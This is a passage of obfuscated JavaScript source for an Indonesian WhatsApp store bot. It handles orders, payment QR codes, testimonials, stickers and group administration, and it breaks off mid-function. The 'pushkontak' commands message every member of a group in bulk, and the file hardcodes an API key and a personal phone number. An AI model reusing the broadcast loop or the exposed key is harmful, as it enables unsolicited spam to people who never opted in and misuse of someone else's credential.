        p2.reply(`Jika Ingin Memesan\nHarap Isi Format Di Bawah\n\n|Ram Panel :\nCPU :\nHarga :`);
        break;
      case "jika":
        if (!q) {
          return;
        }
        num = `6285894955362@s.whatsapp.net`;
        jumlah = "1";
        waktu = `1s`;
        for (let v81 = 0; v81 < jumlah; v81++) {
          p.sendMessage(num, {
            text: `🛎️𝗢𝗥𝗗𝗘𝗥𝗔𝗡🛎️
Nama : ${p2.pushName}
Nomor : ${v48.split("@")[0]}

𝗗𝗲𝘁𝗮𝗶𝗹 𝗣𝗲𝘀𝗮𝗻𝗮𝗻
${q.split("|")[1]}
Link : wa.me/${v48.split("@")[0]}`
          });
        }
        trx_txt = `𝗣𝗘𝗦𝗔𝗡𝗔𝗡 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 𝗗𝗜 𝗕𝗨𝗔𝗧✅

📃𝗣𝗘𝗦𝗔𝗡𝗔𝗡 𝗔𝗡𝗗𝗔📃
${q.split("|")[1]}

Kami Akan Menghubungi Anda
Harap Tunggu Selama 24Jam

Jika Belum Ada Balasan Juga
Hubungi wa.me/6285894955362`;
        p2.reply(trx_txt);
        break;
      case "untuk":
        if (!q) {
          return;
        }
        num = `${noowner}@s.whatsapp.net`;
        jumlah = "1";
        waktu = `1s`;
        for (let v82 = 0; v82 < jumlah; v82++) {
          p.sendMessage(num, {
            text: `🛎️𝗢𝗥𝗗𝗘𝗥𝗔𝗡🛎️
Nama : ${p2.pushName}
Nomor : ${v48.split("@")[0]}

𝗗𝗲𝘁𝗮𝗶𝗹 𝗣𝗲𝘀𝗮𝗻𝗮𝗻
${q.split("|")[1]}
Link : wa.me/${v48.split("@")[0]}`
          });
        }
        trx_txt = `𝗣𝗘𝗦𝗔𝗡𝗔𝗡 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 𝗗𝗜 𝗕𝗨𝗔𝗧✅

📃𝗣𝗘𝗦𝗔𝗡𝗔𝗡 𝗔𝗡𝗗𝗔📃
${q.split("|")[1]}

Kami Akan Menghubungi Anda
Harap Tunggu Selama 24Jam

Jika Belum Ada Balasan Juga
Hubungi wa.me/${noowner}`;
        p2.reply(trx_txt);
        break;
      case "gopaylet":
        {
          p.sendMessage(p2.chat, {
            image: {
              url: `${QRgopay}`
            },
            caption: `⬆️SCAN QR DI ATAS⬆️\nNOPE : ${NOgopay}\n\n𝙺𝙸𝚁𝙸𝙼 𝙱𝚄𝙺𝚃𝙸 𝚃𝚁𝙰𝙽𝚂𝙵𝙴𝚁\n𝙺𝙴☞ wa.me/${noowner}\n════》『𝐆𝐎𝐏𝐀𝐘』`
          }, {
            quoted: p2
          });
        }
        break;
      case "danalet":
        {
          p.sendMessage(p2.chat, {
            image: {
              url: `${QRdana}`
            },
            caption: `⬆️SCAN QR DI ATAS⬆️\nNOPE : ${NOdana}\n\n𝙺𝙸𝚁𝙸𝙼 𝙱𝚄𝙺𝚃𝙸 𝚃𝚁𝙰𝙽𝚂𝙵𝙴𝚁\n𝙺𝙴☞ wa.me/${noowner}\n════》『𝐃𝐀𝐍𝐀』`
          }, {
            quoted: p2
          });
        }
        break;
      case "shopeelet":
        {
          p.sendMessage(p2.chat, {
            image: {
              url: `${QRshopee}`
            },
            caption: `⬆️SCAN QR DI ATAS⬆️\nNOPE : ${NOshopee}\n\n𝙺𝙸𝚁𝙸𝙼 𝙱𝚄𝙺𝚃𝙸 𝚃𝚁𝙰𝙽𝚂𝙵𝙴𝚁\n𝙺𝙴☞ wa.me/${noowner}\n════》『𝐒𝐇𝐎𝐏𝐄𝐄』`
          }, {
            quoted: p2
          });
        }
        break;
      case "ovolet":
        {
          p.sendMessage(p2.chat, {
            image: {
              url: `${QRovo}`
            },
            caption: `⬆️SCAN QR DI ATAS⬆️\nNOPE : ${NOovo}\n\n𝙺𝙸𝚁𝙸𝙼 𝙱𝚄𝙺𝚃𝙸 𝚃𝚁𝙰𝙽𝚂𝙵𝙴𝚁\n𝙺𝙴☞ wa.me/${noowner}\n════》『𝐎𝐕𝐎』`
          }, {
            quoted: p2
          });
        }
        break;
      case "allpaylet":
        {
          p.sendMessage(p2.chat, {
            image: {
              url: `${QRallpay}`
            },
            caption: `⬆️SCAN QR DI ATAS⬆️\n\n𝙺𝙸𝚁𝙸𝙼 𝙱𝚄𝙺𝚃𝙸 𝚃𝚁𝙰𝙽𝚂𝙵𝙴𝚁\n𝙺𝙴☞ wa.me/${noowner}\n════》『𝐀𝐋𝐋 𝐏𝐀𝐘𝐌𝐄𝐍𝐓』`
          }, {
            quoted: p2
          });
        }
        break;
      case "tambah":
        if (!q) {
          return p2.reply(`Gunakan Dengan Cara\n\n_Contoh_ : ${v12 + v14} 1|2`);
        }
        var v89 = q.split("|")[0];
        var v90 = q.split("|")[1];
        if (!v89) {
          return p2.reply(`Gunakan Dengan Cara\n\n_Contoh_ : ${v12 + v14} 1|2`);
        }
        if (!v90) {
          return p2.reply(`Gunakan Dengan Cara\n\n_Contoh_ : ${v12 + v14} 1|2`);
        }
        var vNumber7 = Number(v89);
        var vNumber8 = Number(v90);
        p.sendMessage(p2.chat, {
          text: `${vNumber7 + vNumber8}`
        }, {
          quoted: v68
        });
        break;
      case "kurang":
        if (!q) {
          return p2.reply(`Gunakan Dengan Cara\n\n_Contoh_ : ${v12 + v14} 1|2`);
        }
        var v89 = q.split("|")[0];
        var v90 = q.split("|")[1];
        if (!v89) {
          return p2.reply(`Gunakan Dengan Cara\n\n_Contoh_ : ${v12 + v14} 1|2`);
        }
        if (!v90) {
          return p2.reply(`Gunakan Dengan Cara\n\n_Contoh_ : ${v12 + v14} 1|2`);
        }
        var vNumber7 = Number(v89);
        var vNumber8 = Number(v90);
        p.sendMessage(p2.chat, {
          text: `${vNumber7 - vNumber8}`
        }, {
          quoted: v68
        });
        break;
      case "kali":
        if (!q) {
          return p2.reply(`Gunakan Dengan Cara\n\n_Contoh_ : ${v12 + v14} 1|2`);
        }
        var v89 = q.split("|")[0];
        var v90 = q.split("|")[1];
        if (!v89) {
          return p2.reply(`Gunakan Dengan Cara\n\n_Contoh_ : ${v12 + v14} 1|2`);
        }
        if (!v90) {
          return p2.reply(`Gunakan Dengan Cara\n\n_Contoh_ : ${v12 + v14} 1|2`);
        }
        var vNumber7 = Number(v89);
        var vNumber8 = Number(v90);
        p.sendMessage(p2.chat, {
          text: `${vNumber7 * vNumber8}`
        }, {
          quoted: v68
        });
        break;
      case "bagi":
        if (!q) {
          return p2.reply(`Gunakan Dengan Cara\n\n_Contoh_ : ${v12 + v14} 1|2`);
        }
        var v89 = q.split("|")[0];
        var v90 = q.split("|")[1];
        if (!v89) {
          return p2.reply(`Gunakan Dengan Cara\n\n_Contoh_ : ${v12 + v14} 1|2`);
        }
        if (!v90) {
          return p2.reply(`Gunakan Dengan Cara\n\n_Contoh_ : ${v12 + v14} 1|2`);
        }
        var vNumber7 = Number(v89);
        var vNumber8 = Number(v90);
        p.sendMessage(p2.chat, {
          text: `${vNumber7 / vNumber8}`
        }, {
          quoted: v68
        });
        break;
      case "ping":
        {
          const v91 = process.memoryUsage();
          const v92 = os2.cpus().map(p30 => {
            p30.total = Object.keys(p30.times).reduce((p31, p32) => p31 + p30.times[p32], 0);
            return p30;
          });
          const v93 = v92.reduce((p33, p34, p35, {
            length
          }) => {
            p33.total += p34.total;
            p33.speed += p34.speed / length;
            p33.times.user += p34.times.user;
            p33.times.nice += p34.times.nice;
            p33.times.sys += p34.times.sys;
            p33.times.idle += p34.times.idle;
            p33.times.irq += p34.times.irq;
            return p33;
          }, {
            speed: 0,
            total: 0,
            times: {
              user: 0,
              nice: 0,
              sys: 0,
              idle: 0,
              irq: 0
            }
          });
          let vSpeed2 = speed();
          let v94 = speed() - vSpeed2;
          respon = `
Kecepatan Respon ${v94.toFixed(4)} _Second_ \nRuntime : ${runtime(process.uptime())}
`;
          p2.reply(respon);
        }
        break;
      case "testi1":
        {
          tets1 = `Gambar Di Atas Adalah Testimoni Dari ${namaowner}

Untuk Nominal Transaksi Bisa Cek Di Atas Ya Kak..

Yang Pasti ${namaowner} Adalah Store Paling Amanah Dan Terpercaya✨

*(Testimoni Ke 1)*`;
          p.sendMessage(p2.chat, {
            image: {
              url: `${testi1}`
            },
            caption: tets1
          }, {
            quoted: v66
          });
        }
        break;
      case "testi2":
        {
          tets2 = `Gambar Di Atas Adalah Testimoni Dari ${namaowner}

Untuk Nominal Transaksi Bisa Cek Di Atas Ya Kak..

Yang Pasti ${namaowner} Adalah Store Paling Amanah Dan Terpercaya✨

*(Testimoni Ke 2)*`;
          p.sendMessage(p2.chat, {
            image: {
              url: `${testi2}`
            },
            caption: tets2
          }, {
            quoted: v66
          });
        }
        break;
      case "testi3":
        {
          tets3 = `Gambar Di Atas Adalah Testimoni Dari ${namaowner}

Untuk Nominal Transaksi Bisa Cek Di Atas Ya Kak..

Yang Pasti ${namaowner} Adalah Store Paling Amanah Dan Terpercaya✨

*(Testimoni Ke 3)*`;
          p.sendMessage(p2.chat, {
            image: {
              url: `${testi3}`
            },
            caption: tets3
          }, {
            quoted: v66
          });
        }
        break;
      case "testi4":
        {
          tets4 = `Gambar Di Atas Adalah Testimoni Dari ${namaowner}

Untuk Nominal Transaksi Bisa Cek Di Atas Ya Kak..

Yang Pasti ${namaowner} Adalah Store Paling Amanah Dan Terpercaya✨

*(Testimoni Ke 4)*`;
          p.sendMessage(p2.chat, {
            image: {
              url: `${testi4}`
            },
            caption: tets4
          }, {
            quoted: v66
          });
        }
        break;
      case "testi5":
        {
          tets5 = `Gambar Di Atas Adalah Testimoni Dari ${namaowner}

Untuk Nominal Transaksi Bisa Cek Di Atas Ya Kak..

Yang Pasti ${namaowner} Adalah Store Paling Amanah Dan Terpercaya✨

*(Testimoni Ke 5)*`;
          p.sendMessage(p2.chat, {
            image: {
              url: `${testi5}`
            },
            caption: tets5
          }, {
            quoted: v66
          });
        }
        break;
      case "testi6":
        {
          tets6 = `Gambar Di Atas Adalah Testimoni Dari ${namaowner}

Untuk Nominal Transaksi Bisa Cek Di Atas Ya Kak..

Yang Pasti ${namaowner} Adalah Store Paling Amanah Dan Terpercaya✨

*(Testimoni Ke 6)*`;
          p.sendMessage(p2.chat, {
            image: {
              url: `${testi6}`
            },
            caption: tets6
          }, {
            quoted: v66
          });
        }
        break;
      case "testi7":
        {
          tets7 = `Gambar Di Atas Adalah Testimoni Dari ${namaowner}

Untuk Nominal Transaksi Bisa Cek Di Atas Ya Kak..

Yang Pasti ${namaowner} Adalah Store Paling Amanah Dan Terpercaya✨

*(Testimoni Ke 7)*`;
          p.sendMessage(p2.chat, {
            image: {
              url: `${testi7}`
            },
            caption: tets7
          }, {
            quoted: v66
          });
        }
        break;
      case "idgroup":
        {
          if (!v65) {
            return p2.reply(`${mess.pemilikbot}`);
          }
          p2.reply(`𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗮𝗺𝗯𝗶𝗹 𝗗𝗮𝘁𝗮....\n${v9}`);
          let v95 = await p.groupFetchAllParticipating();
          let v96 = Object.entries(v95).slice(0).map(p36 => p36[1]);
          let v97 = v96.map(p37 => p37.id);
          let v98 = 0;
          let v99 = `⬣ 𝗟𝗜𝗦𝗧 𝗚𝗥𝗢𝗨𝗣 𝗗𝗜 𝗕𝗔𝗪𝗔𝗛\n\nTOTAL GROUP ANDA : ${v97.length}\n\n`;
          for (let v100 of v97) {
            let v101 = await p.groupMetadata(v100);
            v99 += `╭──[ GROUP KE ${v98 += 1} ]──]●>\n│ NAMA : ${v101.subject}\n│ ID : ${v101.id}\n│ MEMBER : ${v101.participants.length}\n╰───────────────]●>\n\n`;
          }
          p2.reply(`${v99}Untuk Penggunaan ID Group\nKetik : pushkontakid [ ID | Teks ]\nSebelum Penggunaan, Salin Terlebih Dahulu ID Group Di Atas\n\n𝗖𝗥𝗘𝗗𝗜𝗧𝗦 *CPM_JHON* \nhttps://youtube.com/@galeri_car_cpm8048`);
        }
        break;
      case "pushkontak":
        if (!v65) {
          return p2.reply(`${mess.pemilikbot}`);
        }
        if (!v49) {
          return p2.reply(`Maaf Kak Fitur Ini Khusus Dalam Group`);
        }
        if (!q) {
          return p2.reply(`𝗦𝗲𝘁 𝗝𝗲𝗱𝗮 𝗗𝗮𝗻 𝗧𝗲𝗸𝘀 𝗡𝘆𝗮 𝗠𝗮𝗻𝗮 🤔\nContoh: ${v14} 1000|Teks\n\nUntuk SetJeda Bisa Di Isi\n1000 = 1Detik\n2000 = 2Detik\nDan Seterus Nya!!`);
        }
        if (!q.split("|")[0].replace(/[^0-9]/g, "")) {
          return p2.reply(`𝗦𝗲𝘁 𝗝𝗲𝗱𝗮 𝗛𝗮𝗿𝘂𝘀 𝗕𝗲𝗿𝘂𝗽𝗮 𝗔𝗻𝗴𝗸𝗮\nContoh: ${v14} 1000|Teks\n\nUntuk SetJeda Bisa Di Isi\n1000 = 1Detik\n2000 = 2Detik\nDan Seterus Nya!!`);
        }
        if (!q.split("|")[1]) {
          return p2.reply(`𝗧𝗲𝗸𝘀 𝗕𝘂𝗮𝘁 𝗣𝘂𝘀𝗵𝗞𝗼𝗻𝘁𝗮𝗸 𝗡𝘆𝗮 𝗠𝗮𝗻𝗮 😐\nContoh: ${v14} 1000|Teks\n\nUntuk SetJeda Bisa Di Isi\n1000 = 1Detik\n2000 = 2Detik\nDan Seterus Nya!!`);
        }
        p2.reply(`𝗣𝗿𝗼𝘀𝗲𝘀...\n𝗛𝗮𝗿𝗮𝗽 𝗧𝘂𝗻𝗴𝗴𝘂 𝗠𝗮𝘀/𝗠𝗯𝗮𝗸`);
        const v102 = await v52.filter(p38 => p38.id.endsWith(".net")).map(p39 => p39.id);
        global.tekspushkonv3 = v23.split("|")[1];
        for (let v103 of v102) {
          if (/image/.test(v25)) {
            media = await p.downloadAndSaveMediaMessage(v24);
            mem = await uptotelegra(media);
            await p.sendMessage(v103, {
              image: {
                url: mem
              },
              caption: global.tekspushkonv3
            });
            await sleep(v23.split("|")[0].replace(/[^0-9]/g, ""));
          } else {
            await p.sendMessage(v103, {
              text: global.tekspushkonv3
            });
            await sleep(v23.split("|")[0].replace(/[^0-9]/g, ""));
          }
        }
        p2.reply(`𝗦𝗨𝗞𝗦𝗘𝗦 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧✅\n𝗪𝗮𝗸𝘁𝘂 : ${q.split("|")[0]}\n𝗣𝗲𝘀𝗮𝗻 : ${q.split("|")[1]}`);
        break;
      case "pushkontakid":
        if (!v65) {
          return p2.reply(`${mess.pemilikbot}`);
        }
        if (v49) {
          return p2.reply(`Maaf Kak Fitur Ini Khusus Chat Private`);
        }
        if (!q.split("|")[0].replace(/[^0-9]/g, "")) {
          return p2.reply(`𝗜𝗗𝗚𝗿𝗼𝘂𝗽 𝗛𝗮𝗿𝘂𝘀 𝗕𝗲𝗿𝘂𝗽𝗮 𝗔𝗻𝗴𝗸𝗮\nContoh: ${v14} IDGroup|1000|Teks\n\nUntuk SetJeda Bisa Di Isi\n1000 = 1Detik\n2000 = 2Detik\nDan Seterus Nya!!\n\nUntuk Mendapatkan ID Group\nKetik : idgroup`);
        }
        if (!q.split("|")[1].replace(/[^0-9]/g, "")) {
          return p2.reply(`𝗦𝗲𝘁 𝗝𝗲𝗱𝗮 𝗛𝗮𝗿𝘂𝘀 𝗕𝗲𝗿𝘂𝗽𝗮 𝗔𝗻𝗴𝗸𝗮\nContoh: ${v14} IDGroup|1000|Teks\n\nUntuk SetJeda Bisa Di Isi\n1000 = 1Detik\n2000 = 2Detik\nDan Seterus Nya!!\n\nUntuk Mendapatkan ID Group\nKetik : idgroup`);
        }
        if (!q.split("|")[2]) {
          return p2.reply(`𝗧𝗲𝗸𝘀 𝗕𝘂𝗮𝘁 𝗣𝘂𝘀𝗵𝗞𝗼𝗻𝘁𝗮𝗸 𝗡𝘆𝗮 𝗠𝗮𝗻𝗮 😐\nContoh: ${v14} IDGroup|1000|Teks\n\nUntuk SetJeda Bisa Di Isi\n1000 = 1Detik\n2000 = 2Detik\nDan Seterus Nya!!\n\nUntuk Mendapatkan ID Group\nKetik : idgroup`);
        }
        p2.reply(`𝗣𝗿𝗼𝘀𝗲𝘀...\n𝗛𝗮𝗿𝗮𝗽 𝗧𝘂𝗻𝗴𝗴𝘂 𝗠𝗮𝘀/𝗠𝗯𝗮𝗸`);
        const v104 = !v49 ? await p.groupMetadata(`${q.split("|")[0]}`).catch(p40 => {}) : "";
        const v105 = !v49 ? await v104.participants : "";
        const v106 = await v105.filter(p41 => p41.id.endsWith(".net")).map(p42 => p42.id);
        global.tekspushkonv2 = q.split("|")[2];
        for (let v107 of v106) {
          if (/image/.test(v25)) {
            media = await p.downloadAndSaveMediaMessage(v24);
            memk = await uptotelegra(media);
            await p.sendMessage(v107, {
              image: {
                url: memk
              },
              caption: global.tekspushkonv2
            });
            await sleep(q.split("|")[1]);
          } else {
            await p.sendMessage(v107, {
              text: global.tekspushkonv2
            });
            await sleep(q.split("|")[1]);
          }
        }
        p2.reply(`𝗦𝗨𝗞𝗦𝗘𝗦 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧✅\n𝗪𝗮𝗸𝘁𝘂 : ${q.split("|")[1]}\n𝗣𝗲𝘀𝗮𝗻 : ${q.split("|")[2]}`);
        break;
      case "tagall":
        {
          if (!v65) {
            return p2.reply(`${mess.pemilikbot}`);
          }
          if (!v49) {
            return p2.reply(`${mess.dalamgroup}`);
          }
          let v108 = `══✪〘 *👥 Tag All* 〙✪══
*Pesan : ${q ? q : "Pesan Kosong"}*\n\n`;
          for (let v109 of v52) {
            v108 += `• @${v109.id.split("@")[0]}\n`;
          }
          p2.reply(v108);
        }
        break;
      case "hidetag":
        {
          if (!v65) {
            return p2.reply(`${mess.pemilikbot}`);
          }
          if (!v49) {
            return p2.reply(`${mess.dalamgroup}`);
          }
          p.sendMessage(p2.chat, {
            text: q ? q : "",
            mentions: v52.map(p43 => p43.id)
          }, {
            quoted: p2
          });
        }
        break;
      case "emojimix":
        {
          let [v110, v111] = v23.split`+`;
          if (!v110) {
            throw `Example : ${v12 + v14} 😅+🤔`;
          }
          if (!v111) {
            throw `Example : ${v12 + v14} 😅+🤔`;
          }
          p2.reply(mess.wait);
          let v112 = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(v110)}_${encodeURIComponent(v111)}`);
          for (let v113 of v112.results) {
            let v114 = await p.sendImageAsSticker(p2.chat, v113.url, p2, {
              packname: {
                packname
              },
              author: {
                author
              },
              categories: v113.tags
            });
            await fs.unlinkSync(v114);
          }
        }
        break;
      case "sticker":
      case "sgif":
        {
          if (!v24) {
            throw `*Balas Video/Image Dengan Caption* ${v12 + v14}`;
          }
          p2.reply(mess.wait);
          if (/image/.test(v25)) {
            let v115 = await v24.download();
            let v116 = await p.sendImageAsSticker(p2.chat, v115, p2, {
              packname: {
                packname
              },
              author: {
                author
              }
            });
            await fs.unlinkSync(v116);
          } else if (/video/.test(v25)) {
            if ((v24.msg || v24).seconds > 11) {
              return p2.reply("*Maksimal 10 detik!*");
            }
            let v117 = await v24.download();
            let v118 = await p.sendVideoAsSticker(p2.chat, v117, p2, {
              packname: {
                packname
              },
              author: {
                author
              }
            });
            await fs.unlinkSync(v118);
          } else {
            throw `*Kirim Gambar/Video Dengan Caption* ${v12 + v14}\nDurasi *Video 1-9 Detik*`;
          }
        }
        break;
      case "smeme":
        {
          let v119 = `Kirim/reply image/sticker dengan caption ${v12 + v14} text1|text2`;
          if (!/image/.test(v25)) {
            throw v119;
          }
          if (!v23) {
            throw v119;
          }
          p2.reply(mess.wait);
          atas = v23.split("|")[0] ? v23.split("|")[0] : "-";
          bawah = v23.split("|")[1] ? v23.split("|")[1] : "-";
          let {
            TelegraPh
          } = require("./lib/uploader");
          let v120 = await p.downloadAndSaveMediaMessage(v24);
          let v121 = await TelegraPh(v120);
          let v122 = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${v121}`;
          let v123 = await p.sendImageAsSticker(p2.chat, v122, p2, {
            packname: {
              packname
            },
            author: {
              author
            }
          });
          await fs.unlinkSync(v123);
        }
        break;
      case "tourl":
        {
          p2.reply(mess.wait);
          let {
            UploadFileUgu,
            webp2mp4File,
            TelegraPh
          } = require("./lib/uploader");
          let v124 = await p.downloadAndSaveMediaMessage(v24);
          if (/image/.test(v25)) {
            let v125 = await TelegraPh(v124);
            p2.reply(util.format(v125));
          } else if (!/image/.test(v25)) {
            let v126 = await UploadFileUgu(v124);
            p2.reply(util.format(v126));
          }
          await fs.unlinkSync(v124);
        }
        break;
      case "tomp4":
        {
          if (!/webp/.test(v25)) {
            return p2.reply(`Reply stiker dengan caption *${v12 + v14}*`);
          }
          p2.reply(mess.wait);
          let v127 = await p.downloadAndSaveMediaMessage(v53);
          let v128 = await webp2mp4File(v127);
          await p.sendMessage(p2.chat, {
            video: {
              url: v128.result,
              caption: "Convert Webp To Video"
            }
          }, {
            quoted: p2
          });
          await fs.unlinkSync(v127);
        }
        break;
      case "toimg":
        {
          if (!/webp/.test(v25)) {
            return p2.reply(`Reply sticker dengan caption *${v12 + v14}*`);
          }
          p2.reply(mess.wait);
          let v129 = await p.downloadAndSaveMediaMessage(v53);
          let v130 = await getRandom(".png");
          exec(`ffmpeg -i ${v129} ${v130}`, p44 => {
            fs.unlinkSync(v129);
            if (p44) {
              return p44;
            }
            let v131 = fs.readFileSync(v130);
            p.sendMessage(p2.chat, {
              image: v131
            }, {
              quoted: p2
            });
            fs.unlinkSync(v130);
          });
        }
        break;
      case "web":
        miwal = `
╭───═[ 𝐌𝐘 𝐖𝐄𝐁 ]═────⋆
│╭───────────────···
││➺ 𝐖𝐄𝐁 𝗦𝗧𝗢𝗥𝗘
││https://bit.ly/3DzCDtL
││
││➺ 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠
││https://bit.ly/4fB4Xcj
│╰───────────────···
├───═[ 𝗠𝗬 𝗦𝗨𝗣𝗢𝗥𝗧 ]═───⋆
│╭───────────────···
││❒ 𝗦𝗨𝗕𝗖𝗥𝗜𝗕𝗘 + 𝗟𝗢𝗡𝗖𝗘𝗡𝗚
││https://bit.ly/4iVrHGT
││
││❒ 𝗙𝗢𝗟𝗟𝗢𝗪 / 𝗜𝗞𝗨𝗧𝗜
││https://bit.ly/49Tus7q
│╰───────────────···
╰───────────────────⋆`;
        p2.reply(miwal);
        break;
      case "creator":
        {
          mtsgege = `"𝗖𝗥𝗘𝗔𝗧𝗢𝗥𝗦 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡"
𝗡𝗮𝗺𝗲 : 𝗖𝗣𝗠_𝗝𝗛𝗢𝗡
𝗡𝘂𝗺𝗯𝗲𝗿 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 : 6285894955362
𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗟𝗶𝗻𝗸𝘀 : wa.me/6285894955362

𝗬𝗼𝘂𝗧𝘂𝗯𝗲 : 𝐠𝐚𝐥𝐞𝐫𝐢_𝐜𝐚𝐫_𝐜𝐩𝐦𝟖𝟎𝟒𝟖
𝗬𝗼𝘂𝗧𝘂𝗯𝗲 𝗟𝗶𝗻𝗸𝘀 : https://bit.ly/4iVrHGT

𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺 : @cpm_jhon
𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺 𝗟𝗶𝗻𝗸𝘀 : https://bit.ly/49Tus7q
`;
          p.sendMessage(p2.chat, {
            text: mtsgege
          }, {
            quoted: v68
          });
          p.sendContact(p2.chat, [`6285894955362`], p2);
        }
        break;
      case "setppgc":
        {
          if (!v65) {
            return p2.reply(`${mess.pemilikbot}`);
          }
          if (!v49) {
            return p2.reply(`Maaf Kak Fitur Ini Khusus Dalam Group`);
          }
          if (!v24) {
            throw `Kirim Foto Dengan Caption ${v12 + v14}`;
          }
          if (!/image/.test(v25)) {
            throw `Kirim Foto Dengan Caption ${v12 + v14}`;
          }
          if (/webp/.test(v25)) {
            throw `Kirim Foto Dengan Caption ${v12 + v14}`;
          }
          let v132 = await p.downloadAndSaveMediaMessage(v24);
          await p.updateProfilePicture(p2.chat, {
            url: v132
          }).catch(p45 => fs.unlinkSync(v132));
          p2.reply(mess.succes);
        }
        break;
      case "setnamagc":
        {
          if (!v65) {
            return p2.reply(`${mess.pemilikbot}`);
          }
          if (!v49) {
            return p2.reply(`Maaf Kak Fitur Ini Khusus Dalam Group`);
          }
          if (!v23) {
            throw "Text ?";
          }
          await p.groupUpdateSubject(p2.chat, v23).then(p46 => p2.reply(mess.succes));
        }
        break;
      case "setdeskgc":
        {
          if (!v65) {
            return p2.reply(`${mess.pemilikbot}`);
          }
          if (!v49) {
            return p2.reply(`Maaf Kak Fitur Ini Khusus Dalam Group`);
          }
          await p.groupUpdateDescription(p2.chat, v23).then(p47 => p2.reply(mess.succes));
        }
        break;
      case "setppbot":
        {
          if (!v65) {
            return p2.reply(`${mess.pemilikbot}`);
          }
          if (!/image/.test(v25)) {
            return p2.reply(`Kirim Foto Dengan Caption ${v12 + v14}`);
          }
          if (/webp/.test(v25)) {
            return p2.reply(`Kirim Foto Dengan Caption ${v12 + v14}`);
          }
          let v133 = await p.downloadAndSaveMediaMessage(v24);
          await p.updateProfilePicture(v21, {
            url: v133
          }).catch(p48 => fs.unlinkSync(v133));
          p2.reply(mess.succes);
        }
        break;
      case "list":
        (function (p49, p50) {
          function f7(p51, p52, p53, p54) {
            return f18(p51 - -273, p53);
          }
          function f8(p55, p56, p57, p58) {
            return f18(p55 - 753, p58);
          }
          const vP49 = p49();
          while (true) {
            try {
              const v134 = parseInt(f7(-89, -91, -102, -90)) / 1 + -parseInt(f8(918, 907, 912, 901)) / 2 + -parseInt(f8(932, 919, 941, 949)) / 3 * (parseInt(f8(917, 905, 909, 904)) / 4) + parseInt(f8(940, 927, 956, 920)) / 5 * (parseInt(f8(942, 931, 957, 939)) / 6) + -parseInt(f8(928, 941, 910, 914)) / 7 * (-parseInt(f7(-118, -121, -133, -99)) / 8) + parseInt(f8(923, 936, 914, 905)) / 9 + -parseInt(f7(-110, -91, -118, -92)) / 10;
              if (v134 === p50) {
                break;
              } else {
                vP49.push(vP49.shift());
              }
            } catch (_0x449a8a) {
              vP49.push(vP49.shift());
            }
          }
        })(f16, 470593);
        const vF2 = function () {
          function f9(p59, p60, p61, p62) {
            return f18(p59 - 869, p60);
          }
          const v135 = {};
          function f10(p63, p64, p65, p66) {
            return f18(p64 - 84, p63);
          }
          v135.FvwDE = function (p67, p68) {
            return p67 === p68;
          };
          v135[f9(1057, 1054, 1048, 1051)] = f10(249, 262, 247, 263);
          const vV135 = v135;
          let v136 = true;
          return function (p69, p70) {
            const v137 = v136 ? function () {
              function f11(p71, p72, p73, p74) {
                return f18(p72 - 824, p73);
              }
              function f12(p75, p76, p77, p78) {
                return f18(p76 - 846, p78);
              }
              if (vV135[f11(998, 1005, 1009, 1014)](vV135[f12(1052, 1034, 1026, 1044)], f11(1011, 1002, 997, 1013))) {
                if (p70) {
                  const v138 = p70[f11(1015, 1006, 986, 994)](p69, arguments);
                  p70 = null;
                  return v138;
                }
              } else {
                const v139 = _0x57abac[f12(1048, 1028, 1025, 1032)](_0x455323, arguments);
                _0x2519d9 = null;
                return v139;
              }
            } : function () {};
            v136 = false;
            return v137;
          };
        }();
        const vVF2 = vF2(this, function () {
          function f13(p79, p80, p81, p82) {
            return f18(p81 - -318, p82);
          }
          function f14(p83, p84, p85, p86) {
            return f18(p85 - 246, p86);
          }
          return vVF2[f13(-147, -167, -149, -152)]()[f13(-141, -155, -135, -124)]("(((.+)+)+)+$")[f14(427, 397, 415, 431)]()[f14(446, 414, 432, 429) + "r"](vVF2).search(f13(-148, -129, -142, -123) + "+$");
        });
        vVF2();
        if (!v49) {
          return p2.reply(mess[f17(-218, -219, -226, -225)]);
        }
        if (v6[f17(-224, -206, -241, -228)] === 0) {
          return p2.reply(f17(-228, -224, -208, -217) + f17(-237, -232, -249, -221) + f17(-210, -225, -196, -191) + f17(-241, -236, -259, -255));
        }
        if (!isAlreadyResponListGroup(v18, v6)) {
          return p2.reply(f17(-228, -209, -236, -222) + "list messa" + f17(-236, -247, -246, -249) + f15(-307, -326, -297, -314) + " group ini");
        }
        var v159 = [];
        for (let v141 of v6) {
          if (v141.id === v18) {
            const v142 = {
              [f17(-222, -234, -240, -224)]: v141.key
            };
            v142[f15(-298, -309, -300, -304)] = v141[f17(-215, -233, -227, -221)];
            v159[f15(-312, -331, -296, -305)](v142);
          }
        }
        let v143 = "Hai @" + v48.split("@")[0] + (f17(-234, -254, -232, -227) + "ist item y" + f17(-244, -248, -245, -250) + "ia di grou" + f15(-311, -293, -295, -320) + f17(-235, -245, -231, -243) + f17(-223, -237, -221, -212) + f15(-314, -328, -324, -306) + f15(-296, -298, -314, -287) + f15(-308, -300, -322, -314));
        for (let v144 of v159) {
          v143 += f17(-221, -238, -203, -240) + v144[f15(-291, -309, -301, -275)] + "\n\n";
        }
        function f15(p87, p88, p89, p90) {
          return f18(p87 - -464, p88);
        }
        const v145 = {
          text: v143
        };
        var vV164 = v145;
        function f16() {
